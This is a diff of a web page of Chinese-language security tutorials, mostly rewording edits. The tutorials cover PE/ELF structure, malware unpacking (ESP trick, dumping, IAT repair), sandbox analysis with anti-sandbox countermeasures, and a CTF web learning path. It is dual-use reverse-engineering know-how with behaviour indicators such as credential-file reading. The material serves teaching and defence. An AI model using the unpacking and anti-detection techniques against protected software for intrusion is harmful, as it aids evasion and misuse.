-| 概念 | 含义 |
+| 概念 | 意思 |
 | --- | --- |
 | RVA | 相对虚拟地址（相对 ImageBase） |
 | VA | 虚拟地址 = ImageBase + RVA |
-| File Offset | 文件里的偏移，与 RVA 不同（要按节换算） |
-| 数据目录 | 导入表、导出表、重定位、TLS、资源的位置 |
+| File Offset | 文件里的偏移，跟 RVA 不是一个东西（得按节换算） |
+| 数据目录 | 导入表、导出表、重定位、TLS、资源在哪 |
 
-**RVA 与文件偏移的换算**是 PE 分析的基本功，几乎所有「找不到字符串」的困惑都来自这里。
+**RVA 换算文件偏移**是 PE 分析的基本功。几乎所有「我明明看到字符串却定位不到」的困惑，都出在这。
 
-用 PEBear / CFF Explorer 打开最直观：左侧树形结构，点「导入表」直接列出依赖的 DLL 与函数。
+用 PEBear / CFF Explorer 打开最直观：左边树一点，导入表直接把依赖的 DLL 和函数列出来。
 
-## 三、导入表：程序会做什么的最快线索
+## 三、导入表：它想干什么的最快线索
 
 ```bash
 objdump -p ./a.out | grep -A20 "DLL Name"
 ```
 
-看到这些 API 就能大致判断行为：
+看到这些 API，大概就能猜出行为：
 
 | API | 说明 |
 | --- | --- |
 | `VirtualAlloc` + `WriteProcessMemory` | 常见于注入 |
 | `CreateRemoteThread` | 远程线程注入 |
 | `RegSetValue` | 改注册表（持久化） |
-| `InternetOpen` / `WinHttpOpen` | 网络通信（C2） |
-| `CryptEncrypt` | 加密（勒索/通信加密） |
+| `InternetOpen` / `WinHttpOpen` | 联网（C2） |
+| `CryptEncrypt` | 加密（勒索 / 通信加密） |
 | `IsDebuggerPresent` | 反调试 |
 
-**逆向往往从导入表开始**，因为这是「作者无法隐藏的意图」。
+**逆向经常从导入表下手**，因为这是作者没法藏起来的意图。
 
-## 四、重定位与 ASLR
+## 四、重定位和 ASLR
 
-PIE / DLL 会被加载到随机基址，代码里的绝对地址需要修正——这就是**重定位表**（ELF `.rela.dyn`，PE `.reloc`）。
+PIE 和 DLL 会被加载到随机基址，代码里的绝对地址得修——这就是**重定位表**（ELF 的 `.rela.dyn`，PE 的 `.reloc`）。
 
 ```bash
 readelf -r ./a.out | head
 ```
 
-如果程序完全位置无关（PIC），重定位会很少；反之说明大量硬编码地址，逆向时可以直接按基址换算。
+要是程序完全位置无关（PIC），重定位就很少；反过来，说明里面一堆硬编码地址，逆向时直接按基址换算就行。
 
-## 五、.bss 与 .data 的差别（常被问）
+## 五、.bss 和 .data 差在哪（常考）
 
 ```c
-int g1 = 42;      // .data：文件里存 42
+int g1 = 42;      // .data：文件里真存着 42
 int g2;           // .bss：文件里不存，加载时清零
-static int g3;    // .bss（或 .data，取决于是否初始化）
+static int g3;    // .bss（或 .data，看有没有初值）
 ```
 
-`.bss` 不占文件体积，只占内存——这也是「文件很小但内存很大」的原因。
+`.bss` 不占文件体积，只占内存——这就是「文件很小但一跑吃一大片内存」的原因。
 
-## 六、实操：三分钟搞清一个陌生 ELF
+## 六、三分钟摸清一个陌生 ELF
 
 ```bash
-file ./sample                 # 架构、是否 stripped、是否静态链接
+file ./sample                 # 架构、有没有 strip、静态还是动态
 readelf -h ./sample           # 入口地址
-readelf -l ./sample | grep -A2 LOAD   # 段权限（有无可写可执行）
+readelf -l ./sample | grep -A2 LOAD   # 段权限（有没有可写可执行）
 strings -a -n 6 ./sample | head -30   # 可疑字符串
-objdump -T ./sample | head -20        # 动态符号（若未 strip）
+objdump -T ./sample | head -20        # 动态符号（没 strip 才有）
 ```
 
-四步之后，你至少知道：它是 32/64 位、动态还是静态、有没有开 NX、用了哪些库、里面有没有明显的 URL 或提示语。
+四步下来，至少知道：32 还是 64 位、动态还是静态、开没开 NX、用了哪些库、里面有没有明显的 URL 或提示语。
 
-## 七、练习
+## 七、动手练
 
-1. 用 `readelf` 逐段打印一个你自己编译的程序，标出 `.text` `.data` `.bss` 的位置
-2. 用 PEBear 打开一个 Windows 程序，找到入口 RVA 并换算成文件偏移
-3. 找一个静态链接的程序，比较它与动态链接版本在 `readelf -d` 上的差异
+1. 用 `readelf` 把自己编的程序逐段打出来，标出 `.text` `.data` `.bss` 在哪
+2. 用 PEBear 开一个 Windows 程序，找到入口 RVA，再换算成文件偏移
+3. 找个静态链接的程序，跟动态链接版本比一比 `readelf -d` 的差别
 
 ## 一句话总结
 
-文件格式是**逆向的地图**：头部告诉你从哪开始，节区告诉你代码与数据在哪，导入表告诉你它想干什么。
+文件格式是**逆向的地图**：头部告诉你从哪开始，节区告诉你代码和数据在哪，导入表告诉你它想干什么。
 </script>
 
 
 <script type="text/markdown" id="md-rev-packing">
-加壳的目的有两类：**压缩体积**（UPX 这类）与**对抗分析**（商业壳、恶意样本壳）。识别壳是逆向的第一步。
+加壳就两个目的：**压缩体积**（UPX 那种）和**对抗分析**（商业壳、恶意样本壳）。认出壳，是逆向第一步。
 
-## 一、加壳做了什么
+## 一、壳到底做了啥
 
 ```
 原程序 → 壳的 stub + 加密/压缩后的原始代码
-运行时：stub 先执行 → 在内存里解出原始代码 → 跳到 OEP
+运行时：stub 先跑 → 在内存里把原始代码解出来 → 跳到 OEP
 ```
 
-因此磁盘上的 `.text` 往往是「看不懂的字节」，真正的指令在内存里才出现。
+所以磁盘上的 `.text` 往往是「看不懂的字节」，真指令要到内存里才出现。
 
-## 二、三种判断方法
+## 二、三种判断法
 
-**1. 区段名**
+**1. 看区段名**
 
 | 壳 | 典型区段 |
 | --- | --- |
@@ -5274,11 +5271,11 @@ objdump -T ./sample | head -20        # 动态符号（若未 strip）
 | Themida | `.themida` `.winlice` |
 | VMProtect | `.vmp0` `.vmp1` |
 
-ELF 侧不叫「区段名」，但常见特征是高熵的 `.text` + 极小的入口段。
+ELF 那边不叫区段名，但特征也明显：`.text` 熵特别高、入口段特别小。
 
-**2. 熵值**
+**2. 看熵值**
 
-压缩/加密后的数据熵接近 8.0（随机）。正常代码段熵通常 5.5–6.5。
+压缩或加密后的数据熵接近 8.0（越随机越高）。正常代码段一般 5.5–6.5。
 
 ```python
 import math, collections
@@ -5288,144 +5285,142 @@ def entropy(data):
     return -sum((n/len(data)) * math.log2(n/len(data)) for n in c.values())
 ```
 
-用 PEiD / DIE（Detect It Easy）可以直接看每个节的熵。
+用 PEiD 或 DIE（Detect It Easy）能直接看每节的熵。
 
-**3. 导入表异常**
+**3. 看导入表**
 
-加壳样本的导入表往往只有 `LoadLibrary` / `GetProcAddress` 寥寥几个——因为真正的 API 要运行时动态解析。
+加壳样本的导入表往往只有 `LoadLibrary` / `GetProcAddress` 那么几个——因为真 API 得运行时动态解析。
 
-## 三、UPX：一行命令的常规脱壳
+## 三、UPX：一行命令的事
 
 ```bash
-upx -d packed.exe -o unpacked.exe    # 自动脱壳
+upx -d packed.exe -o unpacked.exe    # 自动脱
 ```
 
-能这么简单，是因为 UPX 是「公开格式的压缩壳」，`upx -d` 知道怎么还原。**遇到非 UPX 就不行了**。
+能这么简单，是因为 UPX 是公开格式，`upx -d` 知道怎么还原。**换个非 UPX 的就不行了**。
 
-## 四、手工脱壳：两步核心
+## 四、手工脱壳：其实就两步
 
-**第一步：找 OEP（Original Entry Point）**
+**第一步：找 OEP（原始入口）**
 
-思路：壳 stub 解压完会跳到原始入口。常见定位法：
+思路是：壳解压完总得跳到原始入口。常用定位法：
 
-1. **ESP 定律**：在壳入口处对 `ESP` 下硬件断点，运行到 `ESP` 被访问时停下，通常已接近 OEP
+1. **ESP 定律**：在壳入口给 `ESP` 下硬件断点，跑到被访问时停，一般已经接近 OEP
 2. **单步跟跳**：跟过几个大跳转（`jmp eax` / `call [esp]`）
 3. **区段断点**：在「解压目标区段」下执行断点
-4. **内存扫描**：找 `MZ`/`PE` 头（进程镂空类样本）
+4. **内存扫描**：找 `MZ`/`PE` 头（镂空类样本）
 
-**第二步：dump 并修复**
+**第二步：dump + 修**
 
 - 在 OEP 处 dump 进程内存（OllyDumpEx / Scylla）
-- **修复 IAT**（导入地址表）：Scylla 自动搜索，多数壳可一键修复
-- 修正入口点与节表，另存为新文件
+- **修 IAT**（导入地址表）：Scylla 自动搜，多数壳能一键修
+- 改入口点和节表，另存
 
-## 五、ELF 侧的做法
+## 五、ELF 那边怎么弄
 
 ```bash
-# 判断是否加壳
-readelf -S ./sample | grep -E "UPX|packed"
-# 若 UPX 压缩
-upx -d ./sample -o unpacked
+readelf -S ./sample | grep -E "UPX|packed"    # 判断
+upx -d ./sample -o unpacked                   # UPX 压的就直接脱
 ```
 
-ELF 手工脱壳更常出现在 CTF 与 Linux 恶意样本（如挖矿木马）中，思路与 PE 一致：找 OEP、dump、修 ELF 头。
+ELF 手工脱壳更多出现在 CTF 和 Linux 恶意样本（比如挖矿木马）里，思路一样：找 OEP、dump、修 ELF 头。
 
-## 六、脱不掉怎么办：退而求其次
+## 六、脱不掉怎么办：别硬刚
 
-| 情况 | 替代方案 |
+| 情况 | 换条路 |
 | --- | --- |
-| 强壳（VMProtect/Themida） | 放弃静态，改**动态行为分析** |
-| 反调试很强 | 用内核级调试器或 patch 反调试检测 |
-| 只有一小段关键逻辑 | **只 dump 解密后的内存段**，不追求完整还原 |
-| 分析目标是行为 | 沙箱跑行为日志，比脱壳更快 |
+| 强壳（VMProtect / Themida） | 放弃静态，改**动态行为分析** |
+| 反调试很凶 | 上内核级调试器，或 patch 掉检测 |
+| 只关心一小段逻辑 | **只 dump 解密后的内存段**，不求完整还原 |
+| 只想搞清行为 | 沙箱跑一遍，比脱壳快多了 |
 
-**分析的目的不是「脱壳成功」，而是「搞清它做什么」**。能通过沙箱拿到行为链，就不必死磕脱壳。
+**分析的目标不是「脱壳成功」，是「搞清它干什么」**。沙箱能拿到行为链，就别死磕壳。
 
-## 七、防御与检测视角
+## 七、防守侧怎么检测
 
-1. **静态检测**：区段名、熵值、导入表稀少、入口点不在 `.text`
-2. **动态检测**：进程内存出现 `MZ` 头（镂空）、`VirtualProtect` 改内存为可执行、短时间内大量解密
-3. **企业侧**：限制未签名程序执行、开启 AMSI/ETW 监控
+1. **静态**：区段名、熵值、导入表稀少、入口点不在 `.text`
+2. **动态**：内存里出现 `MZ` 头（镂空）、`VirtualProtect` 改成可执行、短时间大量解密
+3. **企业侧**：限制未签名程序、开 AMSI/ETW
 
-## 八、练习
+## 八、动手练
 
-1. 用 UPX 压一个自己写的小程序，再 `upx -d` 还原，比较两个版本的节表
-2. 计算两者的节熵，验证「加壳后熵显著升高」
-3. 找一个教学用的加壳样本，用 ESP 定律定位 OEP（只在隔离虚拟机里做）
+1. 用 UPX 压一个自己写的小程序，再 `upx -d` 还原，比较两版节表
+2. 算一下两版的节熵，验证「加壳后熵明显升高」
+3. 找个教学用的加壳样本，用 ESP 定律定位 OEP（只在隔离虚拟机里做）
 
 ## 一句话总结
 
-加壳是**把代码藏到运行时**。识壳靠区段名与熵，脱壳靠 OEP + dump + 修 IAT；脱不掉就换动态分析，别和壳死磕。
+加壳是**把代码藏到运行时**。识壳看区段名和熵，脱壳靠 OEP + dump + 修 IAT；脱不掉就换动态分析，别跟壳较劲。
 </script>
 
 
 <script type="text/markdown" id="md-rev-sandbox">
-动态分析能拿到静态看不到的东西：**它到底做了什么**。但前提是环境绝对隔离。
+动态分析能拿到静态看不到的东西：**它到底做了什么**。前提是环境绝对隔离。
 
-## 一、环境搭建：四条硬要求
+## 一、环境：四条硬要求
 
-1. **完全断网**（或用 InetSim 模拟网络）——样本联网会暴露你的 IP，也可能被用作攻击源
-2. **虚拟机 + 快照**——每次分析前回滚，分析完销毁
-3. **不装共享文件夹、不挂载宿主机目录**——防横向与数据外泄
-4. **关闭自动运行**：U 盘、网络共享、宏
+1. **完全断网**（或用 InetSim 假装有网）——样本一联网就可能暴露你的 IP，也可能被当成攻击源
+2. **虚拟机 + 快照**——每次分析前回滚，完了销毁
+3. **不装共享文件夹、不挂宿主机目录**——防横向、防数据外泄
+4. **关掉自动运行**：U 盘、网络共享、宏
 
 ```
 推荐组合：
-  VMware / VirtualBox + Windows 10（含 Office、常见运行库）
+  VMware / VirtualBox + Windows 10（装好 Office 和常见运行库）
   + Process Monitor / Process Hacker / Wireshark / x64dbg / Fiddler
-  + 快照：干净初始态
+  + 一个干净的初始快照
 ```
 
-## 二、五类必采证据
+## 二、必采的五类证据
 
 | 类别 | 工具 | 看什么 |
 | --- | --- | --- |
-| 进程 | Process Monitor / Process Hacker | 创建的子进程、注入、命令行 |
+| 进程 | Process Monitor / Process Hacker | 子进程、注入、命令行 |
 | 文件 | Procmon 过滤 Write/Delete | 落地路径、伪装扩展名、自删除 |
 | 注册表 | Procmon 过滤 RegSetValue | 开机启动、服务、劫持 |
 | 网络 | Wireshark / Fiddler / DNS 日志 | C2 域名、协议、心跳间隔 |
 | 持久化 | Autoruns | 启动项、计划任务、服务 |
 
-**时间线**是最终产物：把五类证据按时间排开，就是攻击的叙事线。
+**最后产物是时间线**：五类证据按时间排开，故事自己就出来了。
 
-## 三、一次标准分析流程
+## 三、一次标准流程
 
 ```
-1. 快照回滚 → 启动监控（Procmon + Wireshark）
-2. 静态初判：strings、导入表、熵值（判断是否加壳）
-3. 运行样本，观察 3-5 分钟（有的样本会延迟触发）
-4. 记录：新进程树、落地文件、注册表变更、外连 IP/域名
-5. 关键行为点用 x64dbg 跟进去，确认参数与目的
-6. 生成 IOC：文件哈希、域名、IP、注册表键、互斥体
+1. 回滚快照 → 起监控（Procmon + Wireshark）
+2. 静态初判：strings、导入表、熵值（先看有没有壳）
+3. 跑样本，看 3–5 分钟（有的会延迟触发）
+4. 记下来：进程树、落地文件、注册表变更、外连 IP/域名
+5. 关键行为用 x64dbg 跟进去，确认参数和目的
+6. 出 IOC：文件哈希、域名、IP、注册表键、互斥体
 7. 回滚快照，写报告
 ```
 
-## 四、如何从行为还原意图
+## 四、怎么从行为推意图
 
-| 行为组合 | 推断 |
+| 行为组合 | 大概是什么 |
 | --- | --- |
 | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` | 进程注入 |
 | `RegSetValue` 写 `Run` 键 + 复制自身到 `%AppData%` | 持久化 |
-| 大量文件写 + 扩展名改成 `.locked` + 删除卷影副本 | 勒索软件 |
+| 大量写文件 + 改成 `.locked` 后缀 + 删卷影副本 | 勒索软件 |
 | 定时外连 + 小流量 + 加密载荷 | C2 心跳 |
-| 读取浏览器 `Login Data` + 打包压缩 | 信息窃取 |
+| 读浏览器 `Login Data` + 打包压缩 | 信息窃取 |
 
-**单一行为不构成结论，组合才有意义。**
+**单个行为不算结论，组合才有意义**。
 
-## 五、样本的反沙箱手段
+## 五、样本也会反沙箱
 
-| 手法 | 表现 | 应对 |
+| 手法 | 表现 | 怎么应对 |
 | --- | --- | --- |
 | 检测虚拟机 | 查注册表、MAC 前缀、进程名 | 改配置、去特征 |
 | 检测调试器 | `IsDebuggerPresent`、`NtQueryInformationProcess` | 隐藏调试器、patch 检测 |
 | 延迟执行 | `Sleep(300000)` | 加速时钟、跳过 Sleep |
-| 检查用户交互 | 鼠标是否移动、窗口数量 | 自动化交互 |
-| 检查域名/语言 | 特定地区不执行 | 调整环境区域 |
-| 检测沙箱工具 | 进程名含 `procmon` | 重命名工具 |
+| 查用户交互 | 鼠标不动、窗口太少就不跑 | 自动化交互 |
+| 查地区 / 语言 | 特定区域不执行 | 调区域设置 |
+| 检测沙箱工具 | 进程名里有 `procmon` | 给工具改名 |
 
-遇到「跑起来什么都不做」，八成是反沙箱生效了——**这本身就是重要情报**。
+跑起来啥也不干？八成是反沙箱生效了——**这本身就是有价值的情报**。
 
-## 六、IOC 与检测规则
+## 六、IOC 和检测规则
 
 ```
 文件：SHA256
@@ -5434,7 +5429,7 @@ ELF 手工脱壳更常出现在 CTF 与 Linux 恶意样本（如挖矿木马）�
 行为：命令行特征、父子进程关系
 ```
 
-转成检测规则（伪代码）：
+转成规则（伪代码）：
 
 ```
 process.created
@@ -5443,111 +5438,111 @@ process.created
   → 高危：Office 派生 PowerShell
 ```
 
-## 七、法律与伦理
+## 七、法律和伦理
 
-- 样本只在自己控制的隔离环境分析
-- 不上传样本到公开平台除非确认合规（可能含受害者数据）
-- 分析报告用于防护与研判，不外传可执行样本
+- 样本只在自己控制的隔离环境里分析
+- 别随便上传公开平台（可能夹带受害者数据）
+- 报告用于防护和研判，不外传可执行样本
 
-## 八、练习
+## 八、动手练
 
-1. 搭一个断网 VM，用 Procmon 记录「记事本保存文件」的全部行为，熟悉过滤
-2. 用 InetSim 模拟 DNS/HTTP，观察样本的外连请求
-3. 拿一个公开的教学样本（如 EICAR 或 CTF 样本），产出 IOC 清单与行为时间线
+1. 搭个断网 VM，用 Procmon 记录「记事本存文件」的全过程，先把过滤练熟
+2. 用 InetSim 模拟 DNS/HTTP，看样本的外连请求长什么样
+3. 拿一个公开教学样本（EICAR 或 CTF 样本），产出 IOC 清单和行为时间线
 
 ## 一句话总结
 
-沙箱分析的价值在**证据链**：把进程、文件、注册表、网络四条线按时间对齐，意图自然浮现。隔离是底线，快照是保险。
+沙箱分析值钱的地方是**证据链**：进程、文件、注册表、网络四条线按时间对齐，意图自然浮出来。隔离是底线，快照是保险。
 </script>
 
 
 <script type="text/markdown" id="md-ctf-web-route">
-CTF 的 Web 方向有一个特点：**入门门槛低，天花板极高**。前者让人上瘾，后者让人放弃。区别在于有没有路线。
+CTF 的 Web 方向有个特点：**入门门槛低，天花板极高**。前者让人上头，后者让人放弃。差别就在有没有路线。
 
-## 一、阶段一：三类基础题（2-4 周）
+## 一、阶段一：三类基础题（2–4 周）
 
-| 题类 | 核心 | 判断信号 |
+| 题类 | 核心 | 怎么认出来 |
 | --- | --- | --- |
-| 文件包含 / 读取 | 路径可控 | 参数像 `?file=xxx.php` |
-| SQL 注入 | 拼接与过滤 | 报错、布尔差异、时间延迟 |
+| 文件包含 / 读取 | 路径可控 | 参数长这样 `?file=xxx.php` |
+| SQL 注入 | 拼接、过滤不严 | 报错、布尔差异、时间延迟 |
 | 弱口令 / 源码泄露 | 信息收集 | `.git`、`www.zip`、备份文件 |
 
-**训练方式**：每道题写三样东西——payload、为什么有效、对应防御怎么改。只写 payload 等于没学。
+**怎么练**：每道题写三样东西——payload、为啥有效、防御怎么改。只抄 payload 等于没学。
 
-**必备工具**：Burp Suite（抓包改包）、dirsearch（目录）、sqlmap（验证注入，但先手注一遍再用）。
+**必备工具**：Burp（抓包改包）、dirsearch（扫目录）、sqlmap（验证注入，但先手注一遍再用）。
 
-## 二、阶段二：五类进阶题（4-8 周）
+## 二、阶段二：五类进阶题（4–8 周）
 
 | 题类 | 关键点 |
 | --- | --- |
-| XSS | 不同上下文（HTML/属性/JS/URL）的绕过 |
-| SSRF | 内网探测、协议切换、DNS 重绑定 |
+| XSS | 不同上下文（HTML / 属性 / JS / URL）怎么绕 |
+| SSRF | 探内网、切协议、DNS 重绑定 |
 | 反序列化 | 找利用链（POP chain），读框架源码 |
-| 文件上传 | 后缀/MIME/内容/条件竞争 |
+| 文件上传 | 后缀、MIME、内容、条件竞争 |
 | 代码审计（PHP/Java） | 从入口追到危险函数 |
 
-这一阶段的瓶颈通常不是「不会打」，而是**读不懂源码**。建议同步补 PHP 与 Java Web 基础。
+这一步的瓶颈通常不是「不会打」，是**看不懂源码**。建议同步补 PHP 和 Java Web 基础。
 
-## 三、阶段三：利用链与真实感（长期）
+## 三、阶段三：利用链和真实感（长期）
 
-- **多条漏洞组合**：XSS 打管理员 → 拿到后台 → 文件上传 getshell
-- **框架级漏洞**：Shiro、Fastjson、Spring 的经典链
-- **云与容器**：元数据接口、K8s 配置错误、镜像泄露
+- **多漏洞组合**：XSS 打管理员 → 进后台 → 上传 getshell
+- **框架级漏洞**：Shiro、Fastjson、Spring 那些经典链
+- **云和容器**：元数据接口、K8s 配置错误、镜像泄露
 - **业务逻辑**：越权、并发、状态机绕过
 
-到这一步，题目越来越像真实系统，考察的是**业务理解 + 工程能力**。
+到这一步，题目越来越像真实系统，考的是**业务理解 + 工程能力**。
 
-## 四、每日训练量怎么安排
+## 四、每天练多少
 
 ```
 工作日：1 题 + 15 分钟复盘（写笔记）
-周末：1 套小型比赛（4 小时）+ 补做没解出的题
-每周：整理「本周新学到的 3 个技巧」进自己的知识库
+周末：1 场小比赛（4 小时）+ 补做没解出的题
+每周：整理「这周新学到的 3 个技巧」进自己的库
 ```
 
-**不要刷量**。做 10 题不写复盘，不如做 3 题写透。
+**别拼数量**。做 10 题不写复盘，不如做 3 题写透。
 
-## 五、复盘模板（每道题都填）
+## 五、复盘模板（每题都填）
 
 ```
 题目 / 平台：
 入口点：哪个参数、什么功能
-判断过程：我看到什么信号，推断出什么
+判断过程：我看到什么信号，推出什么
 利用步骤：1) 2) 3)
-卡点：卡在哪、后来怎么想到的
-对应知识点：归到哪个类别
+卡点：卡在哪，后来怎么想到的
+对应知识点：归到哪一类
 防御：如果我是开发，怎么修
 ```
 
-「卡点」那一栏最重要——它是你下次能突破的地方。
+「卡点」那栏最值钱——那是你下次能突破的地方。
 
-## 六、常见误区
+## 六、几个常见误区
 
 | 误区 | 后果 |
 | --- | --- |
 | 只收藏 payload 不写原理 | 换个过滤就废 |
-| 一上来丢 sqlmap | 不懂注入点判断，遇到 WAF 就懵 |
-| 只做本地靶场 | 缺少真实系统的复杂度 |
-| 不做笔记 | 三个月后忘光 |
-| 不学开发 | 读不懂源码，进不了审计题 |
+| 上来就丢 sqlmap | 不懂判断注入点，遇 WAF 就懵 |
+| 只做本地靶场 | 缺真实系统的复杂度 |
+| 不做笔记 | 三个月后全忘 |
+| 不学开发 | 读不懂源码，审计题进不去 |
 
-## 七、把 CTF 能力和就业接起来
+## 七、把 CTF 能力接上找工作
 
-- **Web 渗透岗**：CTF Web 题 + SRC 挖洞 + 报告能力
+- **Web 渗透岗**：CTF Web 题 + SRC 挖洞 + 会写报告
 - **安全研发**：把题里的攻击转成检测规则（WAF 规则、扫描器插件）
 - **代码审计岗**：多读开源框架，练「从入口追到 sink」
 
-CTF 给你的是**攻击视角**，就业还需要**工程与表达能力**。
+CTF 给你的是**攻击视角**，上班还得有**工程和表达能力**。
 
-## 八、练习
+## 八、动手练
 
-1. 给自己排一份 8 周计划：每周 2 个题类，每类 5 题
+1. 给自己排个 8 周计划：每周 2 个题类，每类 5 题
 2. 把最近 3 道题的复盘按上面模板补齐
-3. 选一道你做过的题，写「如果我是开发怎么防」的修复方案
+3. 挑一道做过的题，写「我是开发的话怎么防」
 
 ## 一句话总结
 
-CTF Web 的成长曲线 = **题量 × 复盘深度**。没有复盘，题量只是重复劳动。
+CTF Web 的成长曲线 = **题量 × 复盘深度**。不写复盘，题量只是重复劳动。
 </script>
 
 
@@ -7101,7 +7096,7 @@ WHERE domain IN ('bad.example.com') AND time > now() - 90d;
 </script>
 
 
-<script src="assets/posts.js?v=20261124h"></script>
-<script src="assets/app.js?v=20261124h"></script>
+<script src="assets/posts.js?v=20261124i"></script>
+<script src="assets/app.js?v=20261124i"></script>
 </body>
 </html>
